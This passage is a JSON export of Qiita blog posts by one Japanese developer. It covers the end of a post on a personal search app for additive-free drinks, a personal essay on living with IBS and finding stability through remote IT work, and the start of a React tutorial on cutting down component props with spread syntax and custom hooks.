今後の展望と課題\n1ヶ月での開発だったため、改善の余地があります。特にバッチ処理の安定化が次の目標です。\n\n#### 機能面の改善\n* **ページング改善:** データ数を増やした結果、全件表示したときに全て一つのページで表示されています。10 件ずつ表示などでもっと見やすくしたいです。\n* **データ数を増やしたい:** カテゴリーがカクテル、ビール、チューハイのみのため、ワインや日本酒など様々な種類を検索できるようにしたいです。\n* **アレルゲンでのフィルタリング:** ユーザーストーリーを考えたときに、添加物だけではなくアレルギー持ちの方向けに特定の原材料でフィルタリングもできたらいいなと考えていました。期間を考え優先度をさげましたが、原材料フィルタリングも追加したいと考えています。\n\n* **バッチ機能の向上:** 現在Puppeteerで特定のサイトから自動データ収集をするように作成しています。もっと様々の種類の情報を収集ができるように精度をあげたいです。\n安定したら、ワークフローからcron実行して週に１度実行、定期的に商品を増やせるようにしたいと考えています。\n\n# おわりに\n自分が抱えていた`勉強しているのに何も作れない`状態をまずは脱却できたと思っています。\n2年くらい悩んでいましたが、学習方法を変えてから約５か月で脱却できたことは本当に嬉しいです。\n\nまだまだ技術力、プロダクトを作成するにあたり、知識が不足しています。\nしかし、まずは作ることができた自分を素直に褒めたいと思いました。\n\n今後は、ただ作るだけではなく、`これがないと困る！これがあってよかった！`と思ってもらえるようなプロダクト作りができるようになるよう日々学習をしていきます。\n\n\n# 参考\nhttps://monstar-lab.com/dx/about/about-mvp/\n\nhttps://qiita.com/okikusan-public/items/527263d4eb28f7015ca9#:~:text=2024%2D03%2D17-,%E3%83%A6%E3%83%BC%E3%82%B6%E3%83%BC%E3%82%B9%E3%83%88%E3%83%BC%E3%83%AA%E3%83%BC%E3%81%A8%E3%81%AF,%E3%81%99%E3%82%8B%E3%81%93%E3%81%A8%E3%81%8C%E3%81%A7%E3%81%8D%E3%81%BE%E3%81%99%E3%80%82\n\nhttps://aslead.nri.co.jp/products/miro/column/miro-user-story-mapping.html\n\n# JISOUのメンバー募集中！\nプログラミングコーチングJISOUでは、新たなメンバーを募集しています。\n日本一のアウトプットコミュニティでキャリアアップしませんか？\n興味のある方は、ぜひホームページをのぞいてみてください！\n▼▼▼\n\nhttps://projisou.jp\n","coediting":false,"comments_count":0,"created_at":"2025-06-29T16:06:40+09:00","group":null,"id":"056a601746b49029c768","likes_count":32,"private":false,"reactions_count":0,"stocks_count":13,"tags":[{"name":"初心者","versions":[]},{"name":"ポエム","versions":[]},{"name":"個人開発","versions":[]}],"title":"【個人開発】「添加物のないお酒が見つからない！」を解決する検索アプリを作りました【React/TypeScript/Supabase】","updated_at":"2025-07-20T18:17:36+09:00","url":"https://qiita.com/asa129/items/056a601746b49029c768","user":{"description":"0→1でWebアプリケーションを作れるようになるために奮闘中です。\r\nアイコンは@chinchilla.maruさん\r\nhttps://www.instagram.com/chinchilla.maru/","facebook_id":"","followees_count":45,"followers_count":53,"github_login_name":"asa129","id":"asa129","items_count":62,"linkedin_id":"","location":"","name":"","organization":"","permanent_id":3993509,"profile_image_url":"https://s3-ap-northeast-1.amazonaws.com/qiita-image-store/0/3993509/ea9105b8f7fedddb7175e913eeb5c288385a364a/large.png?1739071881","team_only":false,"twitter_screen_name":"jad1290","website_url":""},"page_views_count":16540,"team_membership":null,"organization_url_name":"jisou","slide":false},{"rendered_body":"<h1 data-sourcepos=\"1:1-1:14\">\n<span id=\"はじめに\" class=\"fragment\"></span><a href=\"#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB\"><i class=\"fa fa-link\"></i></a>はじめに</h1>\n<p data-sourcepos=\"2:1-3:102\">はじめまして。あさと申します。<br>\n現在は、SES企業に所属、主にシステム保守や改修の案件に携わっています。</p>\n<h1 data-sourcepos=\"5:1-5:38\">\n<span id=\"なぜこの記事を書いたのか\" class=\"fragment\"></span><a href=\"#%E3%81%AA%E3%81%9C%E3%81%93%E3%81%AE%E8%A8%98%E4%BA%8B%E3%82%92%E6%9B%B8%E3%81%84%E3%81%9F%E3%81%AE%E3%81%8B\"><i class=\"fa fa-link\"></i></a>なぜこの記事を書いたのか</h1>\n<p data-sourcepos=\"6:1-7:138\">同じ症状で苦しんでいる人に向けて、<strong>こういう働き方もあるよ、絶望しないでほしい、なんとかなるよ</strong>ということを伝えたいと思ったからです。<br>\n（正直、自分が悩んできたことや過去と向き合うこと、記事にして投稿することはとても怖いです。）</p>\n<p data-sourcepos=\"9:1-10:48\">体調面で悩んでいる人に向けて、少しでも何かの救いになればと思い書きます。<br>\nネガティブなことも含め書きます。</p>\n<h1 data-sourcepos=\"12:1-12:29\">\n<span id=\"私の抱えている問題\" class=\"fragment\"></span><a href=\"#%E7%A7%81%E3%81%AE%E6%8A%B1%E3%81%88%E3%81%A6%E3%81%84%E3%82%8B%E5%95%8F%E9%A1%8C\"><i class=\"fa fa-link\"></i></a>私の抱えている問題</h1>\n<p data-sourcepos=\"13:1-16:63\">私は小学 6 年生のころに授業中にガスが止まらなくなる症状がでるようになりました。<br>\n調べていく中で<code>過敏性腸症候群（ＩＢＳ）</code>という症状に自分があてはまることに気づきました。<strong>（日本では約10人に1人が同じ症状で悩んでいると言われています）</strong><br>\n自分の意志とは関係なく四六時中ガスがでそうになり、我慢しても抑えられない状態です。<br>\n発症以来、現在までこの症状に悩んでいます。</p>\n<p data-sourcepos=\"18:1-19:146\">中学、高校と同じように悩み、通院、服薬、カウンセリングなども受けましたが、精神的なものなのか症状が良くなることはありませんでした。<br>\n<code>（通院して、薬を飲んでも症状が改善しない、どうしてもコントロールできないことが一番辛かったです）</code></p>\n<p data-sourcepos=\"21:1-21:222\">自分の症状でスメルハラスメントの加害者となっているため、心無い言葉に傷つき（これは仕方ないと思っています）、解決できないことにとても悩んでいました。</p>\n<p data-sourcepos=\"23:1-24:189\">大学に入学したものの、同じように症状で悩み、二度中退しています。<br>\n学校に行くのが怖い、授業を受けたいのにガスが止まらない、我慢できない、集中できず講義室に入るのが怖い、安心できない状態でした。</p>\n<p data-sourcepos=\"26:1-26:195\">中退したときは、親が頑張って育ててくれて、学校にも通わせてくれたのに、私はそれを無下にした。社会のレールから外れたなと思いました。</p>\n<h1 data-sourcepos=\"29:1-29:31\">\n<span id=\"it業界への挑戦と転機\" class=\"fragment\"></span><a href=\"#it%E6%A5%AD%E7%95%8C%E3%81%B8%E3%81%AE%E6%8C%91%E6%88%A6%E3%81%A8%E8%BB%A2%E6%A9%9F\"><i class=\"fa fa-link\"></i></a>IT業界への挑戦と転機</h1>\n<p data-sourcepos=\"30:1-31:135\">中退後少しずつ、気持ちが回復しました。<br>\n社会人としてちゃんと働きたいと思い、ご縁があって、現在所属しているSESの会社に入社しました。</p>\n<p data-sourcepos=\"33:1-33:169\">研修後、IT企業向けの研修を行う案件の現場にアサインいただきましたが、学校のような環境なため、1か 月で退場しました。</p>\n<p data-sourcepos=\"35:1-36:112\">その後、当時はコロナ禍だったこともあり、<br>\n<strong>フルリモートの案件にアサインいただきました。そこで私の心は救われました。</strong></p>\n<p data-sourcepos=\"38:1-39:100\">自宅で作業をするため、<code>周りに人がいない、症状を気にすることなく仕事ができる</code><br>\n<strong>あ、わたし在宅勤務だったら仕事ができるということに気づきました。</strong></p>\n<p data-sourcepos=\"41:1-42:147\"><code>厳しい言葉や指導をいただいた際も、リモートワークのおかげか</code>、自分の失敗した点は反省、理不尽と思ったことに対してはスルースキルも身に着けることができました。<code>全部自分が悪いと思う考えをせずに済みました。</code><br>\n何よりもリモートワークで働けることがありがたく、辛いなと思ったときも、よし！頑張ろうと思えました。</p>\n<p data-sourcepos=\"44:1-44:267\">3 年間同じ現場で働くことができ、保守改修業務をするうえで成長することができたと思っています。<strong>症状により、物事を続けられないと思っていた私が３年業務を続けられたことに驚きました。</strong></p>\n<p data-sourcepos=\"46:1-47:60\">その後、現在アサインされている現場にて1 年 3 か月経過しています。<br>\n同様にほぼリモートワークで働いています。</p>\n<h1 data-sourcepos=\"49:1-49:71\">\n<span id=\"働けるようになってきて技術力がないことに悩む\" class=\"fragment\"></span><a href=\"#%E5%83%8D%E3%81%91%E3%82%8B%E3%82%88%E3%81%86%E3%81%AB%E3%81%AA%E3%81%A3%E3%81%A6%E3%81%8D%E3%81%A6%E6%8A%80%E8%A1%93%E5%8A%9B%E3%81%8C%E3%81%AA%E3%81%84%E3%81%93%E3%81%A8%E3%81%AB%E6%82%A9%E3%82%80\"><i class=\"fa fa-link\"></i></a>働けるようになってきて、技術力がないことに悩む</h1>\n<p data-sourcepos=\"50:1-50:144\">ありがたいことに現在もほぼリモートワークのため、心身ともに穏やかに生活を送ることができています。</p>\n<p data-sourcepos=\"52:1-52:279\">ただ、人間は満足してくると欲がでるのか、<strong>もっとスキルを磨きたい、せっかく働けるようになってIT業界にいるからにはもっと技術力を磨きたいという思いが強くなり</strong>、転職活動をすることにしました。</p>\n<p data-sourcepos=\"54:1-54:180\">転職活動をするうえで、フィードバックをいただき、自分が行ってきた業務だけでは圧倒的に技術力が足りないことに気づきました。</p>\n<p data-sourcepos=\"56:1-56:206\">これまでも自分なりに勉強はしてきた、業務を通して成長できたと思っていたものの、<strong>1から何かを自分で作ることができない、強みがない</strong>状態です。</p>\n<p data-sourcepos=\"58:1-58:221\">ただ、<code>具体的にどう行動をしたらいいかわからない、継続的に勉強はしているけど身についた感覚がない、目標もなく、ただやみくもに行動している状態</code>でした。</p>\n<p data-sourcepos=\"60:1-61:192\">コミュニティに入会し、勉強方法や考え方を教えてもらいました。<br>\n技術のある人に考え方やメンバーのみなさんの頑張り、作っているプロダクトにすごい！と思いえる機会があり、とても刺激になる日々です。</p>\n<h1 data-sourcepos=\"63:1-63:38\">\n<span id=\"短期目標は成し遂げられた\" class=\"fragment\"></span><a href=\"#%E7%9F%AD%E6%9C%9F%E7%9B%AE%E6%A8%99%E3%81%AF%E6%88%90%E3%81%97%E9%81%82%E3%81%92%E3%82%89%E3%82%8C%E3%81%9F\"><i class=\"fa fa-link\"></i></a>短期目標は成し遂げられた</h1>\n<p data-sourcepos=\"65:1-65:110\">入会した際に、短期目標で<code>0⇒1 で何かをつくれるようになる</code>を掲げていました。</p>\n<p data-sourcepos=\"67:1-67:168\">現在、コミュニティの活動を通して、自分でアイデアを考えＭＶＰを作成、プロダクトを作ることに挑戦、完成できました！</p>\n<p data-sourcepos=\"69:1-69:386\">何をしたらいいかわからない、どうしようと思っていた自分が作りたいものを作ることができる感覚を掴めて、本当に嬉しいです。<code>できないと思っていたことができるようになった、自分の考えを実現できるようになったことはとても自信になりました。作る楽しさも実感できました。</code></p>\n<p data-sourcepos=\"71:1-71:357\">自分はまだまだエンジニアとして未熟だな、開発ができる環境に身を置いてもっと作れるようになりたいと思いもありますが、<code>結局自分は何がしたいの？技術をもっと身に着けてなにがしたいの？</code>と考えたときに<strong>現状を打破したい以外思い浮かびませんでした。</strong></p>\n<h1 data-sourcepos=\"73:1-73:44\">\n<span id=\"心の中で漠然と考えていたこと\" class=\"fragment\"></span><a href=\"#%E5%BF%83%E3%81%AE%E4%B8%AD%E3%81%A7%E6%BC%A0%E7%84%B6%E3%81%A8%E8%80%83%E3%81%88%E3%81%A6%E3%81%84%E3%81%9F%E3%81%93%E3%81%A8\"><i class=\"fa fa-link\"></i></a>心の中で漠然と考えていたこと</h1>\n<h2 data-sourcepos=\"74:1-74:54\">\n<span id=\"同じ症状で苦しんでいる人を救いたい\" class=\"fragment\"></span><a href=\"#%E5%90%8C%E3%81%98%E7%97%87%E7%8A%B6%E3%81%A7%E8%8B%A6%E3%81%97%E3%82%93%E3%81%A7%E3%81%84%E3%82%8B%E4%BA%BA%E3%82%92%E6%95%91%E3%81%84%E3%81%9F%E3%81%84\"><i class=\"fa fa-link\"></i></a>同じ症状で苦しんでいる人を救いたい</h2>\n<p data-sourcepos=\"75:1-75:191\">次にどうすべきかはわからない、具体的には思い浮かばない一方で、<code>長期的、最終的にはこうありたい、叶えたい</code>という考えがありました。</p>\n<p data-sourcepos=\"77:1-77:211\">私が叶えたいと思っていることは、<strong>自分と同じような境遇で苦しんでいる人が少しでも救われる、絶望しなくてもいい生活を送れるようになること</strong>です。</p>\n<p data-sourcepos=\"79:1-79:202\">そして、<strong>同じ悩みを持つ人が一人でも多く心身ともに健康で日々を充実した生活を送れるようなサービスやプロダクトを作りたい</strong>思いもあります。</p>\n<p data-sourcepos=\"81:1-81:90\">抽象的で漠然としているので、誰にも言うつもりはなかったです。</p>\n<p data-sourcepos=\"83:1-83:370\">リモートワークだったら働けるという制約はあるものの、<strong>私は社会に馴染めない、普通に働くことができないと思っていた状態から、もの作りの楽しさを知れたこと、プロダクトを作りを通して世の中の問題解決に貢献できること、やりがいを見つけることができました。</strong></p>\n<p data-sourcepos=\"85:1-85:169\"><strong>同じように悩んでいる人が一人でも心身ともに健康な日々を送れるような何かを提供できる人になりたい</strong>と思っています。</p>\n<h1 data-sourcepos=\"87:1-87:14\">\n<span id=\"おわりに\" class=\"fragment\"></span><a href=\"#%E3%81%8A%E3%82%8F%E3%82%8A%E3%81%AB\"><i class=\"fa fa-link\"></i></a>おわりに</h1>\n<p data-sourcepos=\"88:1-89:87\">自分の症状や悩みをオープンにすること、過去と向き合うがとても怖く、避けていました。<br>\n書くことで気持ちの整理ができ、なぜか気分が楽になりました。</p>\n<h2 data-sourcepos=\"91:1-91:48\">\n<span id=\"同じような悩みを抱えている方へ\" class=\"fragment\"></span><a href=\"#%E5%90%8C%E3%81%98%E3%82%88%E3%81%86%E3%81%AA%E6%82%A9%E3%81%BF%E3%82%92%E6%8A%B1%E3%81%88%E3%81%A6%E3%81%84%E3%82%8B%E6%96%B9%E3%81%B8\"><i class=\"fa fa-link\"></i></a>同じような悩みを抱えている方へ</h2>\n<p data-sourcepos=\"92:1-93:108\">コメントをすることにも抵抗がある人いると思います。（私がそうです）<br>\n下記のフォームで気軽にご連絡いただけると嬉しいです。匿名でも大丈夫です。</p>\n<p data-sourcepos=\"95:1-95:110\"><iframe id=\"qiita-embed-content__1bc9291d934947fdf698c44649c06a2e\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__1bc9291d934947fdf698c44649c06a2e\" data-content=\"https%3A%2F%2Fdocs.google.com%2Fforms%2Fd%2Fe%2F1FAIpQLScpF8JRFsRr5AyTc_T91g7Nzee7So9Qran7LMpRdBUJCEj3Mg%2Fviewform%3Fusp%3Dheader\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<h1 data-sourcepos=\"98:1-98:34\">\n<span id=\"jisouのメンバー募集中\" class=\"fragment\"></span><a href=\"#jisou%E3%81%AE%E3%83%A1%E3%83%B3%E3%83%90%E3%83%BC%E5%8B%9F%E9%9B%86%E4%B8%AD\"><i class=\"fa fa-link\"></i></a>JISOUのメンバー募集中！</h1>\n<p data-sourcepos=\"99:1-102:9\">プログラミングコーチングJISOUでは、新たなメンバーを募集しています。<br>\n日本一のアウトプットコミュニティでキャリアアップしませんか？<br>\n興味のある方は、ぜひホームページをのぞいてみてください！<br>\n▼▼▼</p>\n<p data-sourcepos=\"104:1-104:19\"><iframe id=\"qiita-embed-content__3c4ec3f8a38f00106e3e1b42115c501b\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__3c4ec3f8a38f00106e3e1b42115c501b\" data-content=\"https%3A%2F%2Fprojisou.jp\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n","body":"# はじめに\nはじめまして。あさと申します。\n現在は、SES企業に所属、主にシステム保守や改修の案件に携わっています。\n\n# なぜこの記事を書いたのか\n同じ症状で苦しんでいる人に向けて、**こういう働き方もあるよ、絶望しないでほしい、なんとかなるよ**ということを伝えたいと思ったからです。\n（正直、自分が悩んできたことや過去と向き合うこと、記事にして投稿することはとても怖いです。）\n\n体調面で悩んでいる人に向けて、少しでも何かの救いになればと思い書きます。\nネガティブなことも含め書きます。\n\n# 私の抱えている問題\n私は小学 6 年生のころに授業中にガスが止まらなくなる症状がでるようになりました。\n調べていく中で`過敏性腸症候群（ＩＢＳ）`という症状に自分があてはまることに気づきました。**（日本では約10人に1人が同じ症状で悩んでいると言われています）**\n自分の意志とは関係なく四六時中ガスがでそうになり、我慢しても抑えられない状態です。\n発症以来、現在までこの症状に悩んでいます。\n\n中学、高校と同じように悩み、通院、服薬、カウンセリングなども受けましたが、精神的なものなのか症状が良くなることはありませんでした。\n`（通院して、薬を飲んでも症状が改善しない、どうしてもコントロールできないことが一番辛かったです）`\n\n自分の症状でスメルハラスメントの加害者となっているため、心無い言葉に傷つき（これは仕方ないと思っています）、解決できないことにとても悩んでいました。\n\n大学に入学したものの、同じように症状で悩み、二度中退しています。\n学校に行くのが怖い、授業を受けたいのにガスが止まらない、我慢できない、集中できず講義室に入るのが怖い、安心できない状態でした。\n\n中退したときは、親が頑張って育ててくれて、学校にも通わせてくれたのに、私はそれを無下にした。社会のレールから外れたなと思いました。\n\n\n# IT業界への挑戦と転機\n中退後少しずつ、気持ちが回復しました。\n社会人としてちゃんと働きたいと思い、ご縁があって、現在所属しているSESの会社に入社しました。\n\n研修後、IT企業向けの研修を行う案件の現場にアサインいただきましたが、学校のような環境なため、1か 月で退場しました。\n\nその後、当時はコロナ禍だったこともあり、\n**フルリモートの案件にアサインいただきました。そこで私の心は救われました。**\n\n自宅で作業をするため、`周りに人がいない、症状を気にすることなく仕事ができる`\n**あ、わたし在宅勤務だったら仕事ができるということに気づきました。**\n\n`厳しい言葉や指導をいただいた際も、リモートワークのおかげか`、自分の失敗した点は反省、理不尽と思ったことに対してはスルースキルも身に着けることができました。`全部自分が悪いと思う考えをせずに済みました。`\n何よりもリモートワークで働けることがありがたく、辛いなと思ったときも、よし！頑張ろうと思えました。\n\n3 年間同じ現場で働くことができ、保守改修業務をするうえで成長することができたと思っています。**症状により、物事を続けられないと思っていた私が３年業務を続けられたことに驚きました。**\n\nその後、現在アサインされている現場にて1 年 3 か月経過しています。\n同様にほぼリモートワークで働いています。\n\n# 働けるようになってきて、技術力がないことに悩む\nありがたいことに現在もほぼリモートワークのため、心身ともに穏やかに生活を送ることができています。\n\nただ、人間は満足してくると欲がでるのか、**もっとスキルを磨きたい、せっかく働けるようになってIT業界にいるからにはもっと技術力を磨きたいという思いが強くなり**、転職活動をすることにしました。\n\n転職活動をするうえで、フィードバックをいただき、自分が行ってきた業務だけでは圧倒的に技術力が足りないことに気づきました。\n\nこれまでも自分なりに勉強はしてきた、業務を通して成長できたと思っていたものの、**1から何かを自分で作ることができない、強みがない**状態です。\n\nただ、`具体的にどう行動をしたらいいかわからない、継続的に勉強はしているけど身についた感覚がない、目標もなく、ただやみくもに行動している状態`でした。\n\nコミュニティに入会し、勉強方法や考え方を教えてもらいました。\n技術のある人に考え方やメンバーのみなさんの頑張り、作っているプロダクトにすごい！と思いえる機会があり、とても刺激になる日々です。\n\n# 短期目標は成し遂げられた\n\n入会した際に、短期目標で`0⇒1 で何かをつくれるようになる`を掲げていました。\n\n現在、コミュニティの活動を通して、自分でアイデアを考えＭＶＰを作成、プロダクトを作ることに挑戦、完成できました！\n\n何をしたらいいかわからない、どうしようと思っていた自分が作りたいものを作ることができる感覚を掴めて、本当に嬉しいです。`できないと思っていたことができるようになった、自分の考えを実現できるようになったことはとても自信になりました。作る楽しさも実感できました。`\n\n自分はまだまだエンジニアとして未熟だな、開発ができる環境に身を置いてもっと作れるようになりたいと思いもありますが、`結局自分は何がしたいの？技術をもっと身に着けてなにがしたいの？`と考えたときに**現状を打破したい以外思い浮かびませんでした。**\n\n# 心の中で漠然と考えていたこと\n## 同じ症状で苦しんでいる人を救いたい\n次にどうすべきかはわからない、具体的には思い浮かばない一方で、`長期的、最終的にはこうありたい、叶えたい`という考えがありました。\n\n私が叶えたいと思っていることは、**自分と同じような境遇で苦しんでいる人が少しでも救われる、絶望しなくてもいい生活を送れるようになること**です。\n\nそして、**同じ悩みを持つ人が一人でも多く心身ともに健康で日々を充実した生活を送れるようなサービスやプロダクトを作りたい**思いもあります。\n\n抽象的で漠然としているので、誰にも言うつもりはなかったです。\n\nリモートワークだったら働けるという制約はあるものの、**私は社会に馴染めない、普通に働くことができないと思っていた状態から、もの作りの楽しさを知れたこと、プロダクトを作りを通して世の中の問題解決に貢献できること、やりがいを見つけることができました。**\n\n**同じように悩んでいる人が一人でも心身ともに健康な日々を送れるような何かを提供できる人になりたい**と思っています。\n\n# おわりに\n自分の症状や悩みをオープンにすること、過去と向き合うがとても怖く、避けていました。\n書くことで気持ちの整理ができ、なぜか気分が楽になりました。\n\n## 同じような悩みを抱えている方へ\nコメントをすることにも抵抗がある人いると思います。（私がそうです）\n下記のフォームで気軽にご連絡いただけると嬉しいです。匿名でも大丈夫です。\n\nhttps://docs.google.com/forms/d/e/1FAIpQLScpF8JRFsRr5AyTc_T91g7Nzee7So9Qran7LMpRdBUJCEj3Mg/viewform?usp=header\n\n\n# JISOUのメンバー募集中！\nプログラミングコーチングJISOUでは、新たなメンバーを募集しています。\n日本一のアウトプットコミュニティでキャリアアップしませんか？\n興味のある方は、ぜひホームページをのぞいてみてください！\n▼▼▼\n\nhttps://projisou.jp\n\n","coediting":false,"comments_count":0,"created_at":"2025-06-24T23:06:48+09:00","group":null,"id":"fad180b79a9bc68e978a","likes_count":58,"private":false,"reactions_count":0,"stocks_count":22,"tags":[{"name":"ポエム","versions":[]},{"name":"リモートワーク","versions":[]},{"name":"目標","versions":[]}],"title":"お腹の症状で大学を2度中退した私が、ITとリモートワークに救われた話","updated_at":"2025-07-20T18:18:40+09:00","url":"https://qiita.com/asa129/items/fad180b79a9bc68e978a","user":{"description":"0→1でWebアプリケーションを作れるようになるために奮闘中です。\r\nアイコンは@chinchilla.maruさん\r\nhttps://www.instagram.com/chinchilla.maru/","facebook_id":"","followees_count":45,"followers_count":53,"github_login_name":"asa129","id":"asa129","items_count":62,"linkedin_id":"","location":"","name":"","organization":"","permanent_id":3993509,"profile_image_url":"https://s3-ap-northeast-1.amazonaws.com/qiita-image-store/0/3993509/ea9105b8f7fedddb7175e913eeb5c288385a364a/large.png?1739071881","team_only":false,"twitter_screen_name":"jad1290","website_url":""},"page_views_count":43004,"team_membership":null,"organization_url_name":"jisou","slide":false},{"rendered_body":"<h1 data-sourcepos=\"1:1-1:14\">\n<span id=\"はじめに\" class=\"fragment\"></span><a href=\"#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB\"><i class=\"fa fa-link\"></i></a>はじめに</h1>\n<p data-sourcepos=\"2:1-3:128\">個人で作ったプロジェクトのコンポーネント分割を行っていたところ、propsを10個以上定義する必要がありました。<br>\nコンポーネント分割したもののpropsが多く、解決方法はないか調べたことをまとめてみました。</p>\n<h1 data-sourcepos=\"5:1-5:8\">\n<span id=\"問題\" class=\"fragment\"></span><a href=\"#%E5%95%8F%E9%A1%8C\"><i class=\"fa fa-link\"></i></a>問題</h1>\n<p data-sourcepos=\"6:1-6:59\">コンポーネント分割した際にpropsが多くなる</p>\n<div class=\"code-frame\" data-lang=\"tsx\" data-sourcepos=\"8:1-26:3\">\n<div class=\"code-lang\"><span class=\"bold\">App.tsx</span></div>\n<div class=\"highlight\"><pre><code>  <span class=\"k\">return </span><span class=\"p\">(</span>\n    <span class=\"p\">&lt;&gt;</span>\n          <span class=\"p\">&lt;</span><span class=\"nc\">Search</span>\n            <span class=\"na\">getData</span><span class=\"p\">=</span><span class=\"si\">{</span><span class=\"nx\">getData</span><span class=\"si\">}</span>\n            <span class=\"na\">additivesSearch</span><span class=\"p\">=</span><span class=\"si\">{</span><span class=\"nx\">additivesSearch</span><span class=\"si\">}</span>\n            <span class=\"na\">isDetailedFilterOpen</span><span class=\"p\">=</span><span class=\"si\">{</span><span class=\"nx\">isDetailedFilterOpen</span><span class=\"si\">}</span>\n            <span class=\"na\">setIsDetailedFilterOpen</span><span class=\"p\">=</span><span class=\"si\">{</span><span class=\"nx\">setIsDetailedFilterOpen</span><span class=\"si\">}</span>\n            <span class=\"na\">handleSubmit</span><span class=\"p\">=</span><span class=\"si\">{</span><span class=\"nx\">handleSubmit</span><span class=\"si\">}</span>\n            <span class=\"na\">register</span><span class=\"p\">=</span><span class=\"si\">{</span><span class=\"nx\">register</span><span class=\"si\">}</span>\n            <span class=\"na\">setValue</span><span class=\"p\">=</span><span class=\"si\">{</span><span class=\"nx\">setValue</span><span class=\"si\">}</span>\n            <span class=\"na\">resetField</span><span class=\"p\">=</span><span class=\"si\">{</span><span class=\"nx\">resetField</span><span class=\"si\">}</span>\n            <span class=\"na\">onAdditivesSubmit</span><span class=\"p\">=</span><span class=\"si\">{</span><span class=\"nx\">onAdditivesSubmit</span><span class=\"si\">}</span>\n            <span class=\"na\">handleReset</span><span class=\"p\">=</span><span class=\"si\">{</span><span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"nf\">handleReset</span><span class=\"p\">(</span><span class=\"kc\">true</span><span class=\"p\">)</span><span class=\"si\">}</span>\n          <span class=\"p\">/&gt;</span>\n    <span class=\"p\">&lt;/&gt;</span>\n  <span class=\"p\">);</span>\n<span class=\"p\">}</span>\n</code></pre></div>\n</div>\n<h1 data-sourcepos=\"28:1-28:14\">\n<span id=\"解決方法\" class=\"fragment\"></span><a href=\"#%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95\"><i class=\"fa fa-link\"></i></a>解決方法</h1>\n<h3 data-sourcepos=\"29:1-29:112\">\n<span id=\"1オブジェクトにまとめスプレッド構文オブジェクト名を使って設定する\" class=\"fragment\"></span><a href=\"#1%E3%82%AA%E3%83%96%E3%82%B8%E3%82%A7%E3%82%AF%E3%83%88%E3%81%AB%E3%81%BE%E3%81%A8%E3%82%81%E3%82%B9%E3%83%97%E3%83%AC%E3%83%83%E3%83%89%E6%A7%8B%E6%96%87%E3%82%AA%E3%83%96%E3%82%B8%E3%82%A7%E3%82%AF%E3%83%88%E5%90%8D%E3%82%92%E4%BD%BF%E3%81%A3%E3%81%A6%E8%A8%AD%E5%AE%9A%E3%81%99%E3%82%8B\"><i class=\"fa fa-link\"></i></a>1.オブジェクトにまとめ、スプレッド構文<code>{...オブジェクト名}</code>を使って設定する</h3>\n<div class=\"code-frame\" data-lang=\"tsx\" data-sourcepos=\"30:1-52:3\">\n<div class=\"code-lang\"><span class=\"bold\">App.tsx</span></div>\n<div class=\"highlight\"><pre><code><span class=\"kd\">const</span> <span class=\"nx\">searchProps</span> <span class=\"o\">=</span> <span class=\"p\">{</span>\n  <span class=\"na\">getData</span><span class=\"p\">:</span> <span class=\"nx\">getData</span><span class=\"p\">,</span>\n  <span class=\"na\">additivesSearch</span><span class=\"p\">:</span> <span class=\"nx\">additivesSearch</span><span class=\"p\">,</span>\n  <span class=\"na\">isDetailedFilterOpen</span><span class=\"p\">:</span> <span class=\"nx\">isDetailedFilterOpen</span><span class=\"p\">,</span>\n  <span class=\"na\">setIsDetailedFilterOpen</span><span class=\"p\">:</span> <span class=\"nx\">setIsDetailedFilterOpen</span><span class=\"p\">,</span>\n  <span class=\"na\">handleSubmit</span><span class=\"p\">:</span> <span class=\"nx\">handleSubmit</span><span class=\"p\">,</span>\n  <span class=\"na\">register</span><span class=\"p\">:</span> <span class=\"nx\">register</span><span class=\"p\">,</span>\n  <span class=\"na\">setValue</span><span class=\"p\">:</span> <span class=\"nx\">setValue</span><span class=\"p\">,</span>\n  <span class=\"na\">resetField</span><span class=\"p\">:</span> <span class=\"nx\">resetField</span><span class=\"p\">,</span>\n  <span class=\"na\">onAdditivesSubmit</span><span class=\"p\">:</span> <span class=\"nx\">onAdditivesSubmit</span><span class=\"p\">,</span>\n  <span class=\"na\">handleReset</span><span class=\"p\">:</span> <span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"nf\">handleReset</span><span class=\"p\">(</span><span class=\"kc\">true</span><span class=\"p\">)</span>\n<span class=\"p\">};</span>\n\n<span class=\"c1\">// 省略</span>\n\n  <span class=\"k\">return </span><span class=\"p\">(</span>\n    <span class=\"p\">&lt;&gt;</span>\n      <span class=\"p\">&lt;</span><span class=\"nc\">Search</span> <span class=\"si\">{</span><span class=\"p\">...</span><span class=\"nx\">searchProps</span><span class=\"si\">}</span> <span class=\"p\">/&gt;</span>\n    <span class=\"p\">&lt;/&gt;</span>\n  <span class=\"p\">);</span>\n<span class=\"p\">}</span>\n</code></pre></div>\n</div>\n<p data-sourcepos=\"54:1-54:19\"><strong>MDNより引用</strong></p>\n<blockquote data-sourcepos=\"55:1-55:262\">\n<p data-sourcepos=\"55:2-55:262\">スプレッド (...) 構文を使うと、配列式や文字列などの反復可能オブジェクトを、0 個以上の引数（関数呼び出しの場合）や要素（配列リテラルの場合）を目的の場所に展開することができます。</p>\n</blockquote>\n<p data-sourcepos=\"57:1-57:120\">スプレッド構文で、オブジェクト内のプロパティを一つずつ展開できると理解しました。</p>\n<h3 data-sourcepos=\"59:1-59:27\">\n<span id=\"2custom-hooksを使う\" class=\"fragment\"></span><a href=\"#2custom-hooks%E3%82%92%E4%BD%BF%E3%81%86\"><i class=\"fa fa-link\"></i></a>2.Custom Hooksを使う</h3>\n<p data-sourcepos=\"60:1-60:164\">1の方法は<code>&lt;Search {...searchProps} /&gt;</code>で指定することで、すっきりしましたが、propsの指定が多いことには変わりがありません。</p>\n<p data-sourcepos=\"62:1-63:162\">App.tsxに定義していたSearchコンポーネント関連するものをuseSearchFormとして<code>CustomHooks化</code>しました。<br>\n⇒Searchコンポーネント内に定義することと同じかと思いましたが、再利用できるため、カスタムフック化してみました。</p>\n<div class=\"code-frame\" data-lang=\"ts\" data-sourcepos=\"65:1-103:3\">\n<div class=\"code-lang\"><span class=\"bold\">useSearchForm.ts</span></div>\n<div class=\"highlight\"><pre><code><span class=\"k\">import</span> <span class=\"p\">{</span> 